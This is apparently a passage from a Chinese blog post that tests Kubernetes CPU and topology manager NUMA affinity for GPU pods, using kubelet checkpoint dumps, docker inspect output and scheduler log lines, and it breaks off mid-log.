{\u0026#34;Data\u0026#34;:{\u0026#34;PodDeviceEntries\u0026#34;:[{\u0026#34;PodUID\u0026#34;:\u0026#34;9a15d2b5-c152-46b9-96e0-d57032629e1f\u0026#34;,\u0026#34;ContainerName\u0026#34;:\u0026#34;app\u0026#34;,\u0026#34;ResourceName\u0026#34;:\u0026#34;nvidia.com/gpu\u0026#34;,\u0026#34;DeviceIDs\u0026#34;:{\u0026#34;1\u0026#34;:[\u0026#34;GPU-9b341c59-f96b-ba85-c137-78c3652fea65\u0026#34;,\u0026#34;GPU-c1e9f249-b37b-81c2-a8d9-ba5ca0294841\u0026#34;]},\u0026#34;AllocResp\u0026#34;:\u0026#34;CmsKFk5WSURJQV9WSVNJQkxFX0RFVklDRVMSUUdQVS1jMWU5ZjI0OS1iMzdiLTgxYzItYThkOS1iYTVjYTAyOTQ4NDEsR1BVLTliMzQxYzU5LWY5NmItYmE4NS1jMTM3LTc4YzM2NTJmZWE2NRokCg4vZGV2L252aWRpYWN0bBIOL2Rldi9udmlkaWFjdGwaAnJ3GiYKDy9kZXYvbnZpZGlhLXV2bRIPL2Rldi9udmlkaWEtdXZtGgJydxoyChUvZGV2L252aWRpYS11dm0tdG9vbHMSFS9kZXYvbnZpZGlhLXV2bS10b29scxoCcncaLgoTL2Rldi9udmlkaWEtbW9kZXNldBITL2Rldi9udmlkaWEtbW9kZXNldBoCcncaIAoML2Rldi9udmlkaWExEgwvZGV2L252aWRpYTEaAnJ3GiAKDC9kZXYvbnZpZGlhMhIML2Rldi9udmlkaWEyGgJydw==\u0026#34;}],\u0026#34;RegisteredDevices\u0026#34;:{\u0026#34;nvidia.com/gpu\u0026#34;:[\u0026#34;GPU-77a702db-e37f-3a74-d46d-c5713f66058c\u0026#34;,\u0026#34;GPU-9b341c59-f96b-ba85-c137-78c3652fea65\u0026#34;,\u0026#34;GPU-c1e9f249-b37b-81c2-a8d9-ba5ca0294841\u0026#34;]}},\u0026#34;Checksum\u0026#34;:2530956716}[root@node2 kubelet]# [root@node2 kubelet]#   查看容器信息 docker inspect，已分配GPU资源\n1 2 3 4 5 6 7 8 9 10 11 12 13  \u0026#34;Devices\u0026#34;: [ { \u0026#34;PathOnHost\u0026#34;: \u0026#34;/dev/nvidia1\u0026#34;, \u0026#34;PathInContainer\u0026#34;: \u0026#34;/dev/nvidia1\u0026#34;, \u0026#34;CgroupPermissions\u0026#34;: \u0026#34;rw\u0026#34; }, { \u0026#34;PathOnHost\u0026#34;: \u0026#34;/dev/nvidia2\u0026#34;, \u0026#34;PathInContainer\u0026#34;: \u0026#34;/dev/nvidia2\u0026#34;, \u0026#34;CgroupPermissions\u0026#34;: \u0026#34;rw\u0026#34; } ]   结果：2个GPU都分配到了同1个numa组，cpu资源无指定则使用全部cpuset\npod请求1个GPU，3个cpu  1 2 3 4 5 6 7 8  [root@node2 kubelet]# cat cpu_manager_state {\u0026#34;policyName\u0026#34;:\u0026#34;static\u0026#34;,\u0026#34;defaultCpuSet\u0026#34;:\u0026#34;0,4-27\u0026#34;,\u0026#34;entries\u0026#34;:{\u0026#34;513cb897-0262-4868-826f-aa943ee45a38\u0026#34;:{\u0026#34;app\u0026#34;:\u0026#34;1-3\u0026#34;}},\u0026#34;checksum\u0026#34;:1982473279}[root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# cat device-plugins/kubelet_internal_checkpoint {\u0026#34;Data\u0026#34;:{\u0026#34;PodDeviceEntries\u0026#34;:[{\u0026#34;PodUID\u0026#34;:\u0026#34;513cb897-0262-4868-826f-aa943ee45a38\u0026#34;,\u0026#34;ContainerName\u0026#34;:\u0026#34;app\u0026#34;,\u0026#34;ResourceName\u0026#34;:\u0026#34;nvidia.com/gpu\u0026#34;,\u0026#34;DeviceIDs\u0026#34;:{\u0026#34;0\u0026#34;:[\u0026#34;GPU-77a702db-e37f-3a74-d46d-c5713f66058c\u0026#34;]},\u0026#34;AllocResp\u0026#34;:\u0026#34;CkIKFk5WSURJQV9WSVNJQkxFX0RFVklDRVMSKEdQVS03N2E3MDJkYi1lMzdmLTNhNzQtZDQ2ZC1jNTcxM2Y2NjA1OGMaJAoOL2Rldi9udmlkaWFjdGwSDi9kZXYvbnZpZGlhY3RsGgJydxomCg8vZGV2L252aWRpYS11dm0SDy9kZXYvbnZpZGlhLXV2bRoCcncaMgoVL2Rldi9udmlkaWEtdXZtLXRvb2xzEhUvZGV2L252aWRpYS11dm0tdG9vbHMaAnJ3Gi4KEy9kZXYvbnZpZGlhLW1vZGVzZXQSEy9kZXYvbnZpZGlhLW1vZGVzZXQaAnJ3GiAKDC9kZXYvbnZpZGlhMBIML2Rldi9udmlkaWEwGgJydw==\u0026#34;}],\u0026#34;RegisteredDevices\u0026#34;:{\u0026#34;nvidia.com/gpu\u0026#34;:[\u0026#34;GPU-77a702db-e37f-3a74-d46d-c5713f66058c\u0026#34;,\u0026#34;GPU-9b341c59-f96b-ba85-c137-78c3652fea65\u0026#34;,\u0026#34;GPU-c1e9f249-b37b-81c2-a8d9-ba5ca0294841\u0026#34;]}},\u0026#34;Checksum\u0026#34;:133412836}[root@node2 kubelet]#   查看容器信息 docker inspect，分配了GPU0\n结果：资源充足时，1个GPU，3个cpu都分配到了numa组0，同时满足numa亲和性\npod请求2个GPU，3个cpu  1 2 3 4 5 6 7 8 9 10  [root@node2 kubelet]# cat cpu_manager_state {\u0026#34;policyName\u0026#34;:\u0026#34;static\u0026#34;,\u0026#34;defaultCpuSet\u0026#34;:\u0026#34;0-13,17-27\u0026#34;,\u0026#34;entries\u0026#34;:{\u0026#34;de6df8b8-a6b7-41cc-97a6-19d0fbd44714\u0026#34;:{\u0026#34;app\u0026#34;:\u0026#34;14-16\u0026#34;}},\u0026#34;checksum\u0026#34;:3366848516}[root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# cat device-plugins/kubelet_internal_checkpoint {\u0026#34;Data\u0026#34;:{\u0026#34;PodDeviceEntries\u0026#34;:[{\u0026#34;PodUID\u0026#34;:\u0026#34;de6df8b8-a6b7-41cc-97a6-19d0fbd44714\u0026#34;,\u0026#34;ContainerName\u0026#34;:\u0026#34;app\u0026#34;,\u0026#34;ResourceName\u0026#34;:\u0026#34;nvidia.com/gpu\u0026#34;,\u0026#34;DeviceIDs\u0026#34;:{\u0026#34;1\u0026#34;:[\u0026#34;GPU-9b341c59-f96b-ba85-c137-78c3652fea65\u0026#34;,\u0026#34;GPU-c1e9f249-b37b-81c2-a8d9-ba5ca0294841\u0026#34;]},\u0026#34;AllocResp\u0026#34;:\u0026#34;CmsKFk5WSURJQV9WSVNJQkxFX0RFVklDRVMSUUdQVS05YjM0MWM1OS1mOTZiLWJhODUtYzEzNy03OGMzNjUyZmVhNjUsR1BVLWMxZTlmMjQ5LWIzN2ItODFjMi1hOGQ5LWJhNWNhMDI5NDg0MRokCg4vZGV2L252aWRpYWN0bBIOL2Rldi9udmlkaWFjdGwaAnJ3GiYKDy9kZXYvbnZpZGlhLXV2bRIPL2Rldi9udmlkaWEtdXZtGgJydxoyChUvZGV2L252aWRpYS11dm0tdG9vbHMSFS9kZXYvbnZpZGlhLXV2bS10b29scxoCcncaLgoTL2Rldi9udmlkaWEtbW9kZXNldBITL2Rldi9udmlkaWEtbW9kZXNldBoCcncaIAoML2Rldi9udmlkaWExEgwvZGV2L252aWRpYTEaAnJ3GiAKDC9kZXYvbnZpZGlhMhIML2Rldi9udmlkaWEyGgJydw==\u0026#34;}],\u0026#34;RegisteredDevices\u0026#34;:{\u0026#34;nvidia.com/gpu\u0026#34;:[\u0026#34;GPU-77a702db-e37f-3a74-d46d-c5713f66058c\u0026#34;,\u0026#34;GPU-9b341c59-f96b-ba85-c137-78c3652fea65\u0026#34;,\u0026#34;GPU-c1e9f249-b37b-81c2-a8d9-ba5ca0294841\u0026#34;]}},\u0026#34;Checksum\u0026#34;:4219022648}[root@node2 kubelet]# [root@node2 kubelet]# ll device-plugins/kubelet_internal_checkpoint   查看容器信息 docker inspect，分配了GPU1和2\n结果：资源充足时，2个GPU，3个cpu都分配到了numa组1，同时满足numa亲和性\n 启动2个pod\n pod1：请求1个GPU，3个cpu [场景2] pod2：请求2个GPU，3个cpu [场景3]    1 2 3 4 5 6 7 8 9 10  [root@node2 kubelet]# cat cpu_manager_state {\u0026#34;policyName\u0026#34;:\u0026#34;static\u0026#34;,\u0026#34;defaultCpuSet\u0026#34;:\u0026#34;0,4-13,17-27\u0026#34;,\u0026#34;entries\u0026#34;:{\u0026#34;513cb897-0262-4868-826f-aa943ee45a38\u0026#34;:{\u0026#34;app\u0026#34;:\u0026#34;1-3\u0026#34;},\u0026#34;94283d1b-ce5a-4797-bff8-0cf0c7143b2b\u0026#34;:{\u0026#34;app\u0026#34;:\u0026#34;14-16\u0026#34;}},\u0026#34;checksum\u0026#34;:1623972425}[root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# cat device-plugins/kubelet_internal_checkpoint {\u0026#34;Data\u0026#34;:{\u0026#34;PodDeviceEntries\u0026#34;:[{\u0026#34;PodUID\u0026#34;:\u0026#34;513cb897-0262-4868-826f-aa943ee45a38\u0026#34;,\u0026#34;ContainerName\u0026#34;:\u0026#34;app\u0026#34;,\u0026#34;ResourceName\u0026#34;:\u0026#34;nvidia.com/gpu\u0026#34;,\u0026#34;DeviceIDs\u0026#34;:{\u0026#34;0\u0026#34;:[\u0026#34;GPU-77a702db-e37f-3a74-d46d-c5713f66058c\u0026#34;]},\u0026#34;AllocResp\u0026#34;:\u0026#34;CkIKFk5WSURJQV9WSVNJQkxFX0RFVklDRVMSKEdQVS03N2E3MDJkYi1lMzdmLTNhNzQtZDQ2ZC1jNTcxM2Y2NjA1OGMaJAoOL2Rldi9udmlkaWFjdGwSDi9kZXYvbnZpZGlhY3RsGgJydxomCg8vZGV2L252aWRpYS11dm0SDy9kZXYvbnZpZGlhLXV2bRoCcncaMgoVL2Rldi9udmlkaWEtdXZtLXRvb2xzEhUvZGV2L252aWRpYS11dm0tdG9vbHMaAnJ3Gi4KEy9kZXYvbnZpZGlhLW1vZGVzZXQSEy9kZXYvbnZpZGlhLW1vZGVzZXQaAnJ3GiAKDC9kZXYvbnZpZGlhMBIML2Rldi9udmlkaWEwGgJydw==\u0026#34;},{\u0026#34;PodUID\u0026#34;:\u0026#34;94283d1b-ce5a-4797-bff8-0cf0c7143b2b\u0026#34;,\u0026#34;ContainerName\u0026#34;:\u0026#34;app\u0026#34;,\u0026#34;ResourceName\u0026#34;:\u0026#34;nvidia.com/gpu\u0026#34;,\u0026#34;DeviceIDs\u0026#34;:{\u0026#34;1\u0026#34;:[\u0026#34;GPU-c1e9f249-b37b-81c2-a8d9-ba5ca0294841\u0026#34;,\u0026#34;GPU-9b341c59-f96b-ba85-c137-78c3652fea65\u0026#34;]},\u0026#34;AllocResp\u0026#34;:\u0026#34;CmsKFk5WSURJQV9WSVNJQkxFX0RFVklDRVMSUUdQVS1jMWU5ZjI0OS1iMzdiLTgxYzItYThkOS1iYTVjYTAyOTQ4NDEsR1BVLTliMzQxYzU5LWY5NmItYmE4NS1jMTM3LTc4YzM2NTJmZWE2NRokCg4vZGV2L252aWRpYWN0bBIOL2Rldi9udmlkaWFjdGwaAnJ3GiYKDy9kZXYvbnZpZGlhLXV2bRIPL2Rldi9udmlkaWEtdXZtGgJydxoyChUvZGV2L252aWRpYS11dm0tdG9vbHMSFS9kZXYvbnZpZGlhLXV2bS10b29scxoCcncaLgoTL2Rldi9udmlkaWEtbW9kZXNldBITL2Rldi9udmlkaWEtbW9kZXNldBoCcncaIAoML2Rldi9udmlkaWExEgwvZGV2L252aWRpYTEaAnJ3GiAKDC9kZXYvbnZpZGlhMhIML2Rldi9udmlkaWEyGgJydw==\u0026#34;}],\u0026#34;RegisteredDevices\u0026#34;:{\u0026#34;nvidia.com/gpu\u0026#34;:[\u0026#34;GPU-77a702db-e37f-3a74-d46d-c5713f66058c\u0026#34;,\u0026#34;GPU-9b341c59-f96b-ba85-c137-78c3652fea65\u0026#34;,\u0026#34;GPU-c1e9f249-b37b-81c2-a8d9-ba5ca0294841\u0026#34;]}},\u0026#34;Checksum\u0026#34;:2442330366}[root@node2 kubelet]#   查看容器信息 docker inspect，pod1的计算资源分配到了numa组0；pod2的计算资源分配到了numa组1\n结果：资源充足时，2个pod的计算资源分配满足numa亲和性\n启动2个pod 2，结果同上  pod1：请求1个GPU，3个cpu pod2：请求1个GPU，3个cpu    1 2 3 4 5 6 7  [root@node2 kubelet]# cat cpu_manager_state {\u0026#34;policyName\u0026#34;:\u0026#34;static\u0026#34;,\u0026#34;defaultCpuSet\u0026#34;:\u0026#34;0,4-13,17-27\u0026#34;,\u0026#34;entries\u0026#34;:{\u0026#34;513cb897-0262-4868-826f-aa943ee45a38\u0026#34;:{\u0026#34;app\u0026#34;:\u0026#34;1-3\u0026#34;},\u0026#34;f22736b4-45a9-4852-8fdd-feb948918597\u0026#34;:{\u0026#34;app\u0026#34;:\u0026#34;14-16\u0026#34;}},\u0026#34;checksum\u0026#34;:2054609245}[root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# cat device-plugins/kubelet_internal_checkpoint {\u0026#34;Data\u0026#34;:{\u0026#34;PodDeviceEntries\u0026#34;:[{\u0026#34;PodUID\u0026#34;:\u0026#34;513cb897-0262-4868-826f-aa943ee45a38\u0026#34;,\u0026#34;ContainerName\u0026#34;:\u0026#34;app\u0026#34;,\u0026#34;ResourceName\u0026#34;:\u0026#34;nvidia.com/gpu\u0026#34;,\u0026#34;DeviceIDs\u0026#34;:{\u0026#34;0\u0026#34;:[\u0026#34;GPU-77a702db-e37f-3a74-d46d-c5713f66058c\u0026#34;]},\u0026#34;AllocResp\u0026#34;:\u0026#34;CkIKFk5WSURJQV9WSVNJQkxFX0RFVklDRVMSKEdQVS03N2E3MDJkYi1lMzdmLTNhNzQtZDQ2ZC1jNTcxM2Y2NjA1OGMaJAoOL2Rldi9udmlkaWFjdGwSDi9kZXYvbnZpZGlhY3RsGgJydxomCg8vZGV2L252aWRpYS11dm0SDy9kZXYvbnZpZGlhLXV2bRoCcncaMgoVL2Rldi9udmlkaWEtdXZtLXRvb2xzEhUvZGV2L252aWRpYS11dm0tdG9vbHMaAnJ3Gi4KEy9kZXYvbnZpZGlhLW1vZGVzZXQSEy9kZXYvbnZpZGlhLW1vZGVzZXQaAnJ3GiAKDC9kZXYvbnZpZGlhMBIML2Rldi9udmlkaWEwGgJydw==\u0026#34;},{\u0026#34;PodUID\u0026#34;:\u0026#34;f22736b4-45a9-4852-8fdd-feb948918597\u0026#34;,\u0026#34;ContainerName\u0026#34;:\u0026#34;app\u0026#34;,\u0026#34;ResourceName\u0026#34;:\u0026#34;nvidia.com/gpu\u0026#34;,\u0026#34;DeviceIDs\u0026#34;:{\u0026#34;1\u0026#34;:[\u0026#34;GPU-9b341c59-f96b-ba85-c137-78c3652fea65\u0026#34;]},\u0026#34;AllocResp\u0026#34;:\u0026#34;CkIKFk5WSURJQV9WSVNJQkxFX0RFVklDRVMSKEdQVS05YjM0MWM1OS1mOTZiLWJhODUtYzEzNy03OGMzNjUyZmVhNjUaJAoOL2Rldi9udmlkaWFjdGwSDi9kZXYvbnZpZGlhY3RsGgJydxomCg8vZGV2L252aWRpYS11dm0SDy9kZXYvbnZpZGlhLXV2bRoCcncaMgoVL2Rldi9udmlkaWEtdXZtLXRvb2xzEhUvZGV2L252aWRpYS11dm0tdG9vbHMaAnJ3Gi4KEy9kZXYvbnZpZGlhLW1vZGVzZXQSEy9kZXYvbnZpZGlhLW1vZGVzZXQaAnJ3GiAKDC9kZXYvbnZpZGlhMRIML2Rldi9udmlkaWExGgJydw==\u0026#34;}],\u0026#34;RegisteredDevices\u0026#34;:{\u0026#34;nvidia.com/gpu\u0026#34;:[\u0026#34;GPU-c1e9f249-b37b-81c2-a8d9-ba5ca0294841\u0026#34;,\u0026#34;GPU-77a702db-e37f-3a74-d46d-c5713f66058c\u0026#34;,\u0026#34;GPU-9b341c59-f96b-ba85-c137-78c3652fea65\u0026#34;]}},\u0026#34;Checksum\u0026#34;:3082069630}[root@node2 kubelet]#   查看容器信息 docker inspect，pod1的计算资源分配到了numa组0；pod2的计算资源分配到了numa组1\n结果：资源充足时，2个pod的计算资源分配满足numa亲和性\n启动2个pod 3  pod1：请求0个GPU，3个cpu 已占用了numa组1 pod2：请求1个GPU，3个cpu 测试pod2被分配到哪个numa组    pod2资源都分配到了numa组0，满足numa亲和性\n1 2 3 4 5 6 7 8 9 10 11 12 13  [root@node2 kubelet]# cat cpu_manager_state {\u0026#34;policyName\u0026#34;:\u0026#34;static\u0026#34;,\u0026#34;defaultCpuSet\u0026#34;:\u0026#34;0-13,17-27\u0026#34;,\u0026#34;entries\u0026#34;:{\u0026#34;f21fe02b-e6e2-4d04-9a4a-9e57367fa324\u0026#34;:{\u0026#34;app\u0026#34;:\u0026#34;14-16\u0026#34;}},\u0026#34;checksum\u0026#34;:2485662466} [root@node2 kubelet]# cat cpu_manager_state {\u0026#34;policyName\u0026#34;:\u0026#34;static\u0026#34;,\u0026#34;defaultCpuSet\u0026#34;:\u0026#34;0,4-13,17-27\u0026#34;,\u0026#34;entries\u0026#34;:{\u0026#34;78a1a5c8-39ee-47c3-8e95-9328f1398693\u0026#34;:{\u0026#34;app\u0026#34;:\u0026#34;1-3\u0026#34;},\u0026#34;f21fe02b-e6e2-4d04-9a4a-9e57367fa324\u0026#34;:{\u0026#34;app\u0026#34;:\u0026#34;14-16\u0026#34;}},\u0026#34;checksum\u0026#34;:3632910195}[root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# cat device-plugins/kubelet_internal_checkpoint {\u0026#34;Data\u0026#34;:{\u0026#34;PodDeviceEntries\u0026#34;:[{\u0026#34;PodUID\u0026#34;:\u0026#34;f21fe02b-e6e2-4d04-9a4a-9e57367fa324\u0026#34;,\u0026#34;ContainerName\u0026#34;:\u0026#34;app\u0026#34;,\u0026#34;ResourceName\u0026#34;:\u0026#34;nvidia.com/gpu\u0026#34;,\u0026#34;DeviceIDs\u0026#34;:{\u0026#34;1\u0026#34;:[\u0026#34;GPU-c1e9f249-b37b-81c2-a8d9-ba5ca0294841\u0026#34;]},\u0026#34;AllocResp\u0026#34;:\u0026#34;CkIKFk5WSURJQV9WSVNJQkxFX0RFVklDRVMSKEdQVS1jMWU5ZjI0OS1iMzdiLTgxYzItYThkOS1iYTVjYTAyOTQ4NDEaJAoOL2Rldi9udmlkaWFjdGwSDi9kZXYvbnZpZGlhY3RsGgJydxomCg8vZGV2L252aWRpYS11dm0SDy9kZXYvbnZpZGlhLXV2bRoCcncaMgoVL2Rldi9udmlkaWEtdXZtLXRvb2xzEhUvZGV2L252aWRpYS11dm0tdG9vbHMaAnJ3Gi4KEy9kZXYvbnZpZGlhLW1vZGVzZXQSEy9kZXYvbnZpZGlhLW1vZGVzZXQaAnJ3GiAKDC9kZXYvbnZpZGlhMhIML2Rldi9udmlkaWEyGgJydw==\u0026#34;},{\u0026#34;PodUID\u0026#34;:\u0026#34;78a1a5c8-39ee-47c3-8e95-9328f1398693\u0026#34;,\u0026#34;ContainerName\u0026#34;:\u0026#34;app\u0026#34;,\u0026#34;ResourceName\u0026#34;:\u0026#34;nvidia.com/gpu\u0026#34;,\u0026#34;DeviceIDs\u0026#34;:{\u0026#34;0\u0026#34;:[\u0026#34;GPU-77a702db-e37f-3a74-d46d-c5713f66058c\u0026#34;]},\u0026#34;AllocResp\u0026#34;:\u0026#34;CkIKFk5WSURJQV9WSVNJQkxFX0RFVklDRVMSKEdQVS03N2E3MDJkYi1lMzdmLTNhNzQtZDQ2ZC1jNTcxM2Y2NjA1OGMaJAoOL2Rldi9udmlkaWFjdGwSDi9kZXYvbnZpZGlhY3RsGgJydxomCg8vZGV2L252aWRpYS11dm0SDy9kZXYvbnZpZGlhLXV2bRoCcncaMgoVL2Rldi9udmlkaWEtdXZtLXRvb2xzEhUvZGV2L252aWRpYS11dm0tdG9vbHMaAnJ3Gi4KEy9kZXYvbnZpZGlhLW1vZGVzZXQSEy9kZXYvbnZpZGlhLW1vZGVzZXQaAnJ3GiAKDC9kZXYvbnZpZGlhMBIML2Rldi9udmlkaWEwGgJydw==\u0026#34;}],\u0026#34;RegisteredDevices\u0026#34;:{\u0026#34;nvidia.com/gpu\u0026#34;:[\u0026#34;GPU-77a702db-e37f-3a74-d46d-c5713f66058c\u0026#34;,\u0026#34;GPU-9b341c59-f96b-ba85-c137-78c3652fea65\u0026#34;,\u0026#34;GPU-c1e9f249-b37b-81c2-a8d9-ba5ca0294841\u0026#34;]}},\u0026#34;Checksum\u0026#34;:3193682924}[root@node2 kubelet]#   numa资源不足场景测试 cpu某num组资源不足  启动2个pod 启动2个pod  pod1：请求0个GPU，12个cpu pod2：请求1个GPU，3个cpu    pod1分配到了numa组0，且基本上占满numa组0的cpu资源； 这时pod2再分配资源（cpu和GPU）时，根据numa亲和性策略，要分配到numa组1的cpu和GPU资源\n1 2 3 4 5 6 7 8 9  [root@node2 kubelet]# cat cpu_manager_state {\u0026#34;policyName\u0026#34;:\u0026#34;static\u0026#34;,\u0026#34;defaultCpuSet\u0026#34;:\u0026#34;0,13,17-27\u0026#34;,\u0026#34;entries\u0026#34;:{\u0026#34;77025d90-6e46-4a87-ad3a-bf0c02c6713c\u0026#34;:{\u0026#34;app\u0026#34;:\u0026#34;1-12\u0026#34;},\u0026#34;f21fe02b-e6e2-4d04-9a4a-9e57367fa324\u0026#34;:{\u0026#34;app\u0026#34;:\u0026#34;14-16\u0026#34;}},\u0026#34;checksum\u0026#34;:874856219}[root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# cat device-plugins/kubelet_internal_checkpoint {\u0026#34;Data\u0026#34;:{\u0026#34;PodDeviceEntries\u0026#34;:[{\u0026#34;PodUID\u0026#34;:\u0026#34;f21fe02b-e6e2-4d04-9a4a-9e57367fa324\u0026#34;,\u0026#34;ContainerName\u0026#34;:\u0026#34;app\u0026#34;,\u0026#34;ResourceName\u0026#34;:\u0026#34;nvidia.com/gpu\u0026#34;,\u0026#34;DeviceIDs\u0026#34;:{\u0026#34;1\u0026#34;:[\u0026#34;GPU-c1e9f249-b37b-81c2-a8d9-ba5ca0294841\u0026#34;]},\u0026#34;AllocResp\u0026#34;:\u0026#34;CkIKFk5WSURJQV9WSVNJQkxFX0RFVklDRVMSKEdQVS1jMWU5ZjI0OS1iMzdiLTgxYzItYThkOS1iYTVjYTAyOTQ4NDEaJAoOL2Rldi9udmlkaWFjdGwSDi9kZXYvbnZpZGlhY3RsGgJydxomCg8vZGV2L252aWRpYS11dm0SDy9kZXYvbnZpZGlhLXV2bRoCcncaMgoVL2Rldi9udmlkaWEtdXZtLXRvb2xzEhUvZGV2L252aWRpYS11dm0tdG9vbHMaAnJ3Gi4KEy9kZXYvbnZpZGlhLW1vZGVzZXQSEy9kZXYvbnZpZGlhLW1vZGVzZXQaAnJ3GiAKDC9kZXYvbnZpZGlhMhIML2Rldi9udmlkaWEyGgJydw==\u0026#34;}],\u0026#34;RegisteredDevices\u0026#34;:{\u0026#34;nvidia.com/gpu\u0026#34;:[\u0026#34;GPU-77a702db-e37f-3a74-d46d-c5713f66058c\u0026#34;,\u0026#34;GPU-9b341c59-f96b-ba85-c137-78c3652fea65\u0026#34;,\u0026#34;GPU-c1e9f249-b37b-81c2-a8d9-ba5ca0294841\u0026#34;]}},\u0026#34;Checksum\u0026#34;:2941906560}[root@node2 kubelet]# [root@node2 kubelet]#   启动2个pod 2  启动2个pod\n pod1：请求1个GPU，3个cpu, 已占numa组1 pod2：请求1个GPU，12个cpu  第2个pod 9388acc6-a396-4f03-a353-ce153da46aaf 的cpu资源 占用了numa组0和1，gpu资源占用了numa组0，如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  [root@node2 kubelet]# cat cpu_manager_state {\u0026#34;policyName\u0026#34;:\u0026#34;static\u0026#34;,\u0026#34;defaultCpuSet\u0026#34;:\u0026#34;0-13,17-27\u0026#34;,\u0026#34;entries\u0026#34;:{\u0026#34;f21fe02b-e6e2-4d04-9a4a-9e57367fa324\u0026#34;:{\u0026#34;app\u0026#34;:\u0026#34;14-16\u0026#34;}},\u0026#34;checksum\u0026#34;:2485662466}[root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# cat cpu_manager_state {\u0026#34;policyName\u0026#34;:\u0026#34;static\u0026#34;,\u0026#34;defaultCpuSet\u0026#34;:\u0026#34;0,20-27\u0026#34;,\u0026#34;entries\u0026#34;:{\u0026#34;9388acc6-a396-4f03-a353-ce153da46aaf\u0026#34;:{\u0026#34;app\u0026#34;:\u0026#34;1-13,17-19\u0026#34;},\u0026#34;f21fe02b-e6e2-4d04-9a4a-9e57367fa324\u0026#34;:{\u0026#34;app\u0026#34;:\u0026#34;14-16\u0026#34;}},\u0026#34;checksum\u0026#34;:4055801500}[root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# cat device-plugins/kubelet_internal_checkpoint {\u0026#34;Data\u0026#34;:{\u0026#34;PodDeviceEntries\u0026#34;:[{\u0026#34;PodUID\u0026#34;:\u0026#34;f21fe02b-e6e2-4d04-9a4a-9e57367fa324\u0026#34;,\u0026#34;ContainerName\u0026#34;:\u0026#34;app\u0026#34;,\u0026#34;ResourceName\u0026#34;:\u0026#34;nvidia.com/gpu\u0026#34;,\u0026#34;DeviceIDs\u0026#34;:{\u0026#34;1\u0026#34;:[\u0026#34;GPU-c1e9f249-b37b-81c2-a8d9-ba5ca0294841\u0026#34;]},\u0026#34;AllocResp\u0026#34;:\u0026#34;CkIKFk5WSURJQV9WSVNJQkxFX0RFVklDRVMSKEdQVS1jMWU5ZjI0OS1iMzdiLTgxYzItYThkOS1iYTVjYTAyOTQ4NDEaJAoOL2Rldi9udmlkaWFjdGwSDi9kZXYvbnZpZGlhY3RsGgJydxomCg8vZGV2L252aWRpYS11dm0SDy9kZXYvbnZpZGlhLXV2bRoCcncaMgoVL2Rldi9udmlkaWEtdXZtLXRvb2xzEhUvZGV2L252aWRpYS11dm0tdG9vbHMaAnJ3Gi4KEy9kZXYvbnZpZGlhLW1vZGVzZXQSEy9kZXYvbnZpZGlhLW1vZGVzZXQaAnJ3GiAKDC9kZXYvbnZpZGlhMhIML2Rldi9udmlkaWEyGgJydw==\u0026#34;},{\u0026#34;PodUID\u0026#34;:\u0026#34;9388acc6-a396-4f03-a353-ce153da46aaf\u0026#34;,\u0026#34;ContainerName\u0026#34;:\u0026#34;app\u0026#34;,\u0026#34;ResourceName\u0026#34;:\u0026#34;nvidia.com/gpu\u0026#34;,\u0026#34;DeviceIDs\u0026#34;:{\u0026#34;0\u0026#34;:[\u0026#34;GPU-77a702db-e37f-3a74-d46d-c5713f66058c\u0026#34;]},\u0026#34;AllocResp\u0026#34;:\u0026#34;CkIKFk5WSURJQV9WSVNJQkxFX0RFVklDRVMSKEdQVS03N2E3MDJkYi1lMzdmLTNhNzQtZDQ2ZC1jNTcxM2Y2NjA1OGMaJAoOL2Rldi9udmlkaWFjdGwSDi9kZXYvbnZpZGlhY3RsGgJydxomCg8vZGV2L252aWRpYS11dm0SDy9kZXYvbnZpZGlhLXV2bRoCcncaMgoVL2Rldi9udmlkaWEtdXZtLXRvb2xzEhUvZGV2L252aWRpYS11dm0tdG9vbHMaAnJ3Gi4KEy9kZXYvbnZpZGlhLW1vZGVzZXQSEy9kZXYvbnZpZGlhLW1vZGVzZXQaAnJ3GiAKDC9kZXYvbnZpZGlhMBIML2Rldi9udmlkaWEwGgJydw==\u0026#34;}],\u0026#34;RegisteredDevices\u0026#34;:{\u0026#34;nvidia.com/gpu\u0026#34;:[\u0026#34;GPU-77a702db-e37f-3a74-d46d-c5713f66058c\u0026#34;,\u0026#34;GPU-9b341c59-f96b-ba85-c137-78c3652fea65\u0026#34;,\u0026#34;GPU-c1e9f249-b37b-81c2-a8d9-ba5ca0294841\u0026#34;]}},\u0026#34;Checksum\u0026#34;:4148283274}[root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]#   此时的拓扑管理器的策略结果输出如下，虽然有部分cpu和gpu不在同一个numa组，认为cpu和gpu的合并分配结果仍满足numa亲和性\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  Dec 29 15:13:13 node2 kubelet[117175]: I1229 15:13:13.740680 117175 topology_manager.go:187] [topologymanager] Topology Admit Handler Dec 29 15:13:13 node2 kubelet[117175]: I1229 15:13:13.740755 117175 scope_container.go:80] [topologymanager] TopologyHints for pod \u0026#39;16cpu-numa-batch-pod_default(9388acc6-a396-4f03-a353-ce153da46aaf)\u0026#39;, container \u0026#39;app\u0026#39;: map[nvidia.com/gpu:[{01 true} {10 true} {11 false}]] Dec 29 15:13:13 node2 kubelet[117175]: I1229 15:13:13.740986 117175 policy_static.go:379] [cpumanager] TopologyHints generated for pod \u0026#39;16cpu-numa-batch-pod_default(9388acc6-a396-4f03-a353-ce153da46aaf)\u0026#39;, container \u0026#39;app\u0026#39;: [{11 true}] Dec 29 15:13:13 node2 kubelet[117175]: I1229 15:13:13.741009 117175 scope_container.go:80] [topologymanager] TopologyHints for pod \u0026#39;16cpu-numa-batch-pod_default(9388acc6-a396-4f03-a353-ce153da46aaf)\u0026#39;, container \u0026#39;app\u0026#39;: map[cpu:[{11 true}]] Dec 29 15:13:13 node2 kubelet[117175]: I1229 